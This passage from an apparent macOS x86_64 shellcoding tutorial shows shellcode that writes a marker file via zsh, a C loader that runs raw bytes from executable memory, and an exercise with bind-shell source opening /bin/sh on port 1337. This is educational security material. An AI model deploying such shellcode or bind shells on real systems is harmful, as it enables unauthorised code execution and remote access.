```sh
shellcoding% xxd -r -p shellcode_otool.hex > shellcode_otool.bin
```

- Check shellcode length

```sh
Shellcoding% wc -c shellcode_otool.bin
      93 shellcode_otool.bin
```

- Convert it to `C` array

```sh
Shellcoding% cat shellcode_otool.h
unsigned char shellcode_otool_bin[] = {
  0x48, 0x31, 0xc9, 0x51, 0x48, 0xba, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x7a,
  0x73, 0x68, 0x52, 0x48, 0x89, 0xe7, 0xbb, 0x2d, 0x63, 0x00, 0x00, 0x53,
  0x48, 0x89, 0xe3, 0x51, 0xe8, 0x21, 0x00, 0x00, 0x00, 0x65, 0x63, 0x68,
  0x6f, 0x20, 0x22, 0x57, 0x30, 0x30, 0x74, 0x57, 0x30, 0x30, 0x74, 0x22,
  0x20, 0x3e, 0x20, 0x2f, 0x74, 0x6d, 0x70, 0x2f, 0x50, 0x77, 0x6e, 0x65,
  0x64, 0x2e, 0x74, 0x78, 0x74, 0x00, 0x53, 0x57, 0x48, 0x89, 0xe6, 0x48,
  0x31, 0xd2, 0xb8, 0x3b, 0x00, 0x00, 0x02, 0x0f, 0x05, 0xb8, 0x01, 0x00,
  0x00, 0x02, 0xbf, 0x00, 0x00, 0x00, 0x00, 0x0f, 0x05
};
unsigned int shellcode_otool_bin_len = 93;
```

## Test Shellcode with Loader

Now, Let's write a loader in `C` to try and execute our shellcode.

```C
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sys/wait.h>
#include <stdlib.h>

int main(void) {
    unsigned char code[] = {
      0x48, 0x31, 0xc9, 0x51, 0x48, 0xba, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x7a,
      0x73, 0x68, 0x52, 0x48, 0x89, 0xe7, 0xbb, 0x2d, 0x63, 0x00, 0x00, 0x53,
      0x48, 0x89, 0xe3, 0x51, 0xe8, 0x21, 0x00, 0x00, 0x00, 0x65, 0x63, 0x68,
      0x6f, 0x20, 0x22, 0x57, 0x30, 0x30, 0x74, 0x57, 0x30, 0x30, 0x74, 0x22,
      0x20, 0x3e, 0x20, 0x2f, 0x74, 0x6d, 0x70, 0x2f, 0x50, 0x77, 0x6e, 0x65,
      0x64, 0x2e, 0x74, 0x78, 0x74, 0x00, 0x53, 0x57, 0x48, 0x89, 0xe6, 0x48,
      0x31, 0xd2, 0xb8, 0x3b, 0x00, 0x00, 0x02, 0x0f, 0x05, 0xb8, 0x01, 0x00,
      0x00, 0x02, 0xbf, 0x00, 0x00, 0x00, 0x00, 0x0f, 0x05
    };
    size_t len = sizeof(code);

    pid_t pid = fork();
    if (pid < 0) {
        perror("fork");
        return 1;
    }

    if (pid == 0) {
        // child: allocate RWX, copy shellcode and execute
        void *exec = mmap(NULL, len, PROT_READ|PROT_WRITE|PROT_EXEC,
                          MAP_ANON|MAP_PRIVATE, -1, 0);
        if (exec == MAP_FAILED) {
            perror("mmap");
            _exit(127);
        }
        memcpy(exec, code, len);

        // print from child so you can see it if child doesn't get replaced
        printf("[child %d] executing shellcode (%zu bytes)...\n", getpid(), len);
        fflush(stdout);

        int (*func)() = (int(*)())exec;
        int r = func(); // if shellcode calls execve, child will be replaced
        // If returned, report and exit child
        printf("[child %d] shellcode returned %d\n", getpid(), r);
        fflush(stdout);
        _exit(r & 0xFF);
    } else {
        // parent: wait for child and then check side-effect
        int status = 0;
        printf("[parent %d] spawned child %d, waiting...\n", getpid(), pid);
        fflush(stdout);

        if (waitpid(pid, &status, 0) == -1) {
            perror("waitpid");
            return 2;
        }

        if (WIFEXITED(status)) {
            printf("[parent] child exited with status %d\n", WEXITSTATUS(status));
        } else if (WIFSIGNALED(status)) {
            printf("[parent] child killed by signal %d\n", WTERMSIG(status));
        } else {
            printf("[parent] child ended with status 0x%x\n", status);
        }

        // small sleep to allow any async side-effects to settle
        usleep(200000);

        const char *check_path = "/tmp/Pwned.txt";
        if (access(check_path, F_OK) == 0) {
            printf("[parent] Success: '%s' exists.\n", check_path);
            return 0;
        } else {
            printf("[parent] Failure: '%s' not found (errno=%d: %s)\n",
                   check_path, errno, strerror(errno));
            return 3;
        }
    }
}
```

The loader’s job is simple: it stores raw machine-code bytes (the shellcode) in a C `unsigned char` array, allocates a memory region with execute permission, copies the bytes into that region, casts the region pointer to a function pointer, and then calls it. That direct transfer of control is what lets the program run arbitrary machine code in the address space of the process. Because the shellcode can call `execve`, `_exit`, crash, or otherwise change the process state, the loader must be written with the understanding that control might never return to the original C runtime after the call into the shellcode. In the original single-process loader, `unsigned char code[] = { ... };` places the bytes in the program’s data segment; `size_t len = sizeof(code);` computes the number of bytes to map and copy. The program then calls `mmap(NULL, len, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANON|MAP_PRIVATE, -1, 0)`. This requests an anonymous (no-file-back) memory mapping with read, write and execute permissions; `NULL` lets the kernel choose the address, `len` is the requested size, and `MAP_ANON|MAP_PRIVATE` means the mapping is private and not backed by a file. If `mmap` fails (returns `MAP_FAILED`) the loader prints the error and exits. After a successful mapping the loader uses `memcpy(exec, code, len)` to place the shellcode bytes into the mapped pages, then casts the `void *` returned by `mmap` to a function pointer (`int (*func)() = (int(*)())exec;`) and calls `func()`. Casting a data pointer to a code pointer and invoking it is implementation-defined in the C standard, but is the de‑facto technique used on `POSIX` systems for this purpose. What can happen when the call to `func()` executes depends entirely on what the shellcode does. If the shellcode is written to return cleanly it will restore registers and the stack appropriately and the loader continues execution after the call. If the shellcode invokes `execve()` successfully, the kernel replaces the entire process image with a new program, so none of the loader’s code after the call executes. If the shellcode calls `_exit()` or the process receives a fatal signal (segfault, illegal instruction), the process terminates and again no post-call statements run. Shellcode that corrupts the stack or registers without restoring them will also produce undefined behavior in the loader when control returns. In short: seeing only the pre-exec print usually means the shellcode either replaced or terminated the process or crashed it before your post-exec prints could run. A forked-loader variant is useful because it isolates the untrusted shellcode in a child process while the parent remains alive to observe results. When the program `fork()`, the child repeats the mapping, copy and invocation of the shellcode; any `execve` or `_exit` inside the child affects only the child. The parent calls `waitpid(child, &status, 0)` to get the child’s exit status and can report whether the child exited normally, was killed by a signal, or returned a particular code. The parent can also check for side-effects such as files written by the child (for example `/tmp/Pwned.txt`) and print reliable diagnostics. This pattern is ideal for debugging shellcode that tends to replace or terminate its host process — the parent becomes the stable observer.

- Compile and Test the shellcode with the loader

```C
zeyadazima.com% clang -o cloader cloader.c
zeyadazima.com% ./cloader 
[parent 29373] spawned child 29374, waiting...
[child 29374] executing shellcode (93 bytes)...
[parent] child exited with status 0
[parent] Success: '/tmp/Pwned.txt' exists.
```

As we can see our shellcode executed successfully with no issues.

# Exercises

If you want to dive deeper more, you can do this exercise which is involving in creating a `BindShell` shellcode and execute it. 

Here all the things you need for the excersice:

- BindShell `C` code

```C
// Source - https://stackoverflow.com/q
// Posted by gatorface, modified by community. See post 'Timeline' for change history
// Retrieved 2025-11-10, License - CC BY-SA 3.0

// Author:  Julien Ahrens (@MrTuxracer)
// Website:  http://www.rcesecurity.com 

#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>

int main(void)
{
    int i; // used for dup2 later
    int sockfd; // socket file descriptor
    int clientfd; // client file descriptor
    socklen_t socklen; // socket-length for new connections

    struct sockaddr_in srv_addr; // server aka listen address
    struct sockaddr_in cli_addr; // client address

    srv_addr.sin_family = AF_INET; // server socket type address family = internet protocol address
    srv_addr.sin_port = htons( 1337 ); // server port, converted to network byte order
    srv_addr.sin_addr.s_addr = htonl (INADDR_ANY); // listen on any address, converted to network byte order

    // create new TCP socket
    sockfd = socket(2, 1, 0);

    // bind socket
    bind( sockfd, (struct sockaddr *)&srv_addr, sizeof(srv_addr) );

    // listen on socket
    listen(sockfd, 0);

    // accept new connections
    socklen = sizeof(cli_addr);
    clientfd = accept(sockfd, (struct sockaddr *)&cli_addr, &socklen );

    // dup2-loop to redirect stdin(0), stdout(1) and stderr(2)
    for(i = 0; i <= 2; i++)
        dup2(clientfd, i);

    // magic
    // execve( "/bin/sh", NULL, NULL );

    //UPDATE: fixed exec call, shell still not returned to
    // client connecting with execl or proper execve
    execl("/bin/sh", "/bin/sh", (char *)NULL);
}

```

Tasks:

- Use `execve()` instead of `execl`
- Collect the syscall for `socket`,`bind`,`listen`,`accept` and `dup2`. As you will use it to build your `BindShell`.
- Study the functions arguments and get it ready for the functions/syscalls
- Make sure to go around with the `struct`, Cause it's similler to the way we built arrays
- Make sure to use the kernel source code to hop-around to find a variable value, like the `#define AF_INET` for example and explore the source code to help you creating your shellcode.

## Help ?

If you got any questions or need help, You can contact me:
- [Linkedin](https://www.linkedin.com/in/zer0verflow/)
- [Twitter/X](https://x.com/AzimaZeyad)
- Email: [contact@zeyadazima.com](mailto:contact@zeyadazima.com)
- Discord: `.killer_1337` including `.`

# Conclusion

We explored the fundamentals of writing shellcode on `macOS` for the `x86_64` architecture. We set up a proper lab environment, understood the `XNU` kernel and its syscall classes, and clarified calling conventions and register usage crucial for crafting shellcode. By following a structured workflow—starting from `C` code, identifying syscalls, converting to assembly, and handling arguments—we successfully created shellcodes for printing text, terminating processes, and executing commands. Through these examples, we demonstrated practical techniques such as handling arguments on the stack, using position-independent code, and correctly invoking syscalls in the `BSD` subsystem of `macOS`. This foundation sets the stage for more advanced topics.




# References

- https://codebrowser.dev/
- https://man.freebsd.org/
- https://pubs.opengroup.org
- https://man7.org/linux/man-pages/
- https://opensource.apple.com/releases/
- https://github.com/apple-oss-distributions/xnu
- https://xcodereleases.com
- https://newosxbook.com
